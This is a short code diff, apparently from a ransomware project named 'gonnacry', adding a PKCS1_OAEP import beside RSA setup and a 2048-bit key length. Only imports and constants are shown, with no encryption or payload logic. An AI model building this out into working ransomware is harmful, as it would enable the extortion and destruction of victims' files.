@@ -1,6 +1,7 @@
 import os
 import base64
 from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
 
 bit_len = 2048
 ransomware_name = "gonnacry"
